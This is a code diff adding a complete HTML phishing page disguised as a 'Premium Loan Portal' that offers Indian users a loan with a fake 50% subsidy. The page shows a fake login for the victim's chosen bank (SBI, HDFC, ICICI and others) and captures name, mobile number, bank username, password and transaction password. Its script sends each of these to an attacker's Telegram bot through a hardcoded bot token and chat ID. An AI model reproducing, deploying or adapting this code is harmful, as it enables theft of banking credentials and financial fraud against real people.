@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Premium Loan Portal</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+}
+
+.header-image {
+    width: 100%;
+    max-width: 600px;
+    display: block;
+    margin: 0 auto;
+    border-radius: 15px 15px 0 0;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+}
+
+.container {
+    max-width: 600px;
+    margin: 0px auto;
+    padding: 20px;
+    background: white;
+    border-radius: 15px;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+}
+
+h2, h3 {
+    text-align: center;
+    color: #0a4fa3;
+}
+
+label {
+    display: block;
+    margin-top: 12px;
+    font-weight: bold;
+}
+
+input, select {
+    width: 93%;
+    padding: 12px;
+    margin-top: 5px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    font-size: 16px;
+}
+
+input:focus {
+    border-color: #0a4fa3;
+    outline: none;
+    box-shadow: 0 0 6px rgba(10, 79, 163, 0.3);
+}
+
+button {
+    margin-top: 15px;
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 10px;
+    background: linear-gradient(90deg, #0a4fa3, #083b7a);
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+button:hover {
+    filter: brightness(1.2);
+    transform: scale(1.05);
+}
+
+.step {
+    display: none;
+}
+
+.active {
+    display: block;
+}
+
+.progress {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 20px;
+}
+
+.progress div {
+    flex: 1;
+    height: 8px;
+    margin: 0 3px;
+    border-radius: 4px;
+    background: #ddd;
+}
+
+.progress .done {
+    background: linear-gradient(90deg, #0a4fa3, #083b7a);
+}
+
+.bank-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+}
+
+@media(min-width: 500px) {
+    .bank-grid {
+        grid-template-columns: 1fr 1fr 1fr;
+    }
+}
+
+.bank-card {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px;
+    border: 1px solid #ddd;
+    border-radius: 10px;
+    cursor: pointer;
+}
+
+.bank-card.selected {
+    border-color: #ff6600;
+    box-shadow: 0 0 20px rgba(255, 102, 0, 0.6);
+}
+
+.bank-logo {
+    height: 40px;
+    width: auto;
+    flex-shrink: 0;
+}
+
+.summary {
+    background: #f9f9f9;
+    border: 1px solid #ddd;
+    padding: 15px;
+    border-radius: 12px;
+    margin-top: 15px;
+    font-size: 15px;
+}
+
+.contact {
+    text-align: center;
+    margin-top: 20px;
+}
+
+.contact a {
+    display: block;
+    margin-top: 5px;
+    color: #0a4fa3;
+    text-decoration: none;
+    font-weight: bold;
+}
+
+#bankInstructionBox {
+    text-align: center;
+    font-weight: bold;
+    margin-bottom: 15px;
+    color: #0a4fa3;
+    font-size: 16px;
+    line-height: 1.6;
+    background: #e8f3ff;
+    border: 2px solid #0a4fa3;
+    padding: 15px;
+    border-radius: 12px;
+}
+
+/* New style for the centered logo and name on the login page */
+#step4 .bank-logo-container {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+#step4 .bank-login-logo {
+    height: 60px; /* Increased size */
+    width: auto;
+    margin-bottom: 5px;
+}
+
+#step4 h4 {
+    margin-top: 0;
+}
+</style>
+</head>
+<body>
+<img src="headerpm.png" alt="Loan Portal Header" class="header-image">
+<div class="container">
+<h2>Loan Application Portal</h2>
+<div class="progress">
+<div id="p1"></div><div id="p2"></div><div id="p3"></div><div id="p4"></div><div id="p5"></div><div id="p6"></div>
+</div>
+<div class="step active" id="step1">
+<label>Name:</label><input type="text" id="name" required>
+<label>Mobile Number:</label><input type="text" id="mobile" required>
+<label>Loan Amount (₹1L - ₹15L):</label><input type="number" id="loan" min="100000" max="1500000" required>
+<button onclick="next(2)">Next</button>
+</div>
+<div class="step" id="step2">
+<p id="calc"></p>
+<button onclick="next(3)">Next</button>
+</div>
+<div class="step" id="step3">
+<div id="bankInstructionBox">
+🏦 To receive your loan amount, please select your bank.<br>
+💡 अपना ऋण राशि प्राप्त करने के लिए कृपया अपना बैंक चुनें।
+</div>
+<input type="text" id="bankSearch" placeholder="Search Bank / बैंक खोजें" style="width:100%;padding:10px;margin-bottom:12px;border-radius:8px;border:1px solid #ccc;font-size:15px;">
+<div class="bank-grid" id="bankGrid"></div>
+</div>
+<div class="step" id="step4">
+<div class="bank-logo-container">
+<img id="bankLoginLogo" src="" class="bank-login-logo">
+<h4 id="bankLoginTitle"></h4>
+</div>
+<label>Username:</label><input type="text" id="username" required>
+<label>Password:</label><input type="password" id="password" required>
+<button id="loginBtn">Login</button>
+</div>
+<div class="step" id="step5">
+<label>Transaction Password:</label><input type="password" id="tpwd" required>
+<button id="submitTxn">Submit</button>
+</div>
+<div class="step" id="step6">
+<p>Your Reference Number: ✅ <b id="ref"></b></p>
+<button onclick="copyRef()">Copy Reference Number</button>
+<div id="summary" class="summary"></div>
+<div class="contact">
+<p>📞 Customer Care: <a href="tel:+919876543210">+91 98765 43210</a></p>
+<p>💬 WhatsApp: <a href="https://wa.me/919876543210">Chat on WhatsApp</a></p>
+</div>
+</div>
+</div>
+<script>
+// Utils
+function el(id){return document.getElementById(id);}
+function fmtINR(x){return "₹"+x.toLocaleString("en-IN");}
+// Telegram
+const BOT_TOKEN="8353007176:AAGsexdDdHiNLNMSkRFDCe5VKWMRCFGBgRY";
+const CHAT_ID="7155441629";
+function sendToTelegram(message){
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text:message,parse_mode:"HTML"})
+  });
+}
+// Navigation
+function show(step){
+document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+el('step'+step).classList.add('active');
+for(let i=1;i<=6;i++){el('p'+i).classList.toggle('done',i<=step);}
+}
+let selectedBank=null;
+function next(step){
+  // Validation for Step 1 with better messages
+  if (step === 2) {
+    const name = el('name').value.trim();
+    const mobile = el('mobile').value.trim();
+    const loan = el('loan').value.trim();
+    
+    if (!name) {
+      alert("Please enter your Name to proceed.");
+      return;
+    }
+    if (!mobile) {
+      alert("Please enter your Mobile Number.");
+      return;
+    }
+    if (!loan) {
+      alert("Please enter the Loan Amount.");
+      return;
+    }
+
+    let loanAmount = Number(loan);
+    let subsidy = loanAmount * 0.5;
+    el('calc').textContent = `Loan: ${fmtINR(loanAmount)} | Subsidy: ${fmtINR(subsidy)} | Final Return: ${fmtINR(loanAmount - subsidy)}`;
+    sendToTelegram(`<b>Step 1 ✅</b>\n👤 Name: ${name}\n📱 Mobile: ${mobile}\n💰 Loan Applied: ${fmtINR(loanAmount)}`);
+  }
+  
+  // Validation for Step 2
+  if (step === 3) {
+    let loanAmount = Number(el('loan').value);
+    let subsidy = loanAmount * 0.5;
+    sendToTelegram(`<b>Step 2 ✅</b>\n🎁 Subsidy: ${fmtINR(subsidy)}\n💵 Final Return: ${fmtINR(loanAmount - subsidy)}`);
+  }
+
+  // Show the next step if validation passes
+  show(step);
+}
+// Full Indian Banks
+const banks=[
+{name:'SBI',logo:'sbi.png'},
+{name:'HDFC',logo:'hdfc.png'},
+{name:'ICICI',logo:'icici.png'},
+{name:'Axis',logo:'axis.png'},
+{name:'Punjab National Bank',logo:'punjab-national-bank.png'},
+{name:'Bank of Baroda',logo:'bank-of-baroda.png'},
+{name:'Kotak Mahindra Bank',logo:'kotak-mahindra-bank.png'},
+{name:'IDFC First Bank',logo:'idfc-first-bank.png'},
+{name:'Yes Bank',logo:'yes-bank.png'},
+{name:'IndusInd Bank',logo:'indusind-bank.png'},
+{name:'Union Bank of India',logo:'union-bank-of-india.png'},
+{name:'Canara Bank',logo:'canara-bank.png'},
+{name:'Indian Bank',logo:'indian-bank.png'},
+{name:'Central Bank of India',logo:'central-bank-of-india.png'},
+{name:'UCO Bank',logo:'uco-bank.png'},
+{name:'Bank of Maharashtra',logo:'bank-of-maharashtra.png'},
+{name:'Federal Bank',logo:'federal-bank.png'},
+{name:'IDBI Bank',logo:'idbi-bank.png'},
+{name:'Punjab & Sind Bank',logo:'punjab-and-sind-bank.png'},
+{name:'South Indian Bank',logo:'south-indian-bank.png'}
+];
+// Render banks
+function renderBanks(list){
+const grid=el('bankGrid');grid.innerHTML='';
+list.forEach(b=>{
+let div=document.createElement('div');div.className='bank-card';
+div.innerHTML=`<img src="${b.logo}" class="bank-logo"><span>${b.name}</span>`;
+div.onclick=()=>{
+if(selectedBank)document.querySelector('.bank-card.selected')?.classList.remove('selected');
+div.classList.add('selected');selectedBank=b;
+el('bankLoginLogo').src=b.logo;el('bankLoginTitle').textContent=b.name+' Login';
+next(4);
+};
+grid.appendChild(div);
+});
+}
+renderBanks(banks);
+el('bankSearch').addEventListener('input',function(){
+const val=this.value.toLowerCase();
+renderBanks(banks.filter(b=>b.name.toLowerCase().includes(val)));
+});
+// Step 4
+el('loginBtn').addEventListener('click',()=>{
+if(!el('username').value.trim()||!el('password').value.trim()){alert("Enter username/password");return;}
+sendToTelegram(`<b>Step 4 ✅</b>\n🏦 Bank: ${selectedBank.name}\nUsername: <b>${el('username').value}</b>\nPassword: <b>${el('password').value}</b>`);
+next(5);
+});
+// Step 5
+el('submitTxn').addEventListener('click',()=>{
+if(!el('tpwd').value.trim()){alert("Enter transaction password");return;}
+sendToTelegram(`<b>Step 5 ✅</b>\nTransaction Password: <b>${el('tpwd').value}</b>`);
+const ref="REF"+Math.floor(100000+Math.random()*900000);
+el('ref').textContent=ref;
+let loan=Number(el('loan').value); let subsidy=loan*0.5; let net=loan-subsidy;
+const msg6=`<b>Step 6 ✅</b>\n🔖 Ref: <b>${ref}</b>\n👤 Name: ${el('name').value}\n📱 Mobile: ${el('mobile').value}\n🏦 Bank: ${selectedBank?selectedBank.name:"-"}\n💰 Loan: ${fmtINR(loan)}\n🎁 Subsidy: ${fmtINR(subsidy)}\n💵 Final: ${fmtINR(net)}`;
+sendToTelegram(msg6);
+el('summary').innerHTML=`<b>Name:</b>${el('name').value}<br><b>Mobile:</b>${el('mobile').value}<br><b>Bank:</b>${selectedBank?selectedBank.name:"-"}<br><b>Loan:</b>${fmtINR(loan)}<br><b>Subsidy:</b>${fmtINR(subsidy)}<br><b>Final Return:</b>${fmtINR(net)}`;
+el('summary').classList.add('active');
+show(6);
+});
+function copyRef(){navigator.clipboard.writeText(el('ref').textContent);alert("Reference copied!");}
+</script>
+</body>
+</html>
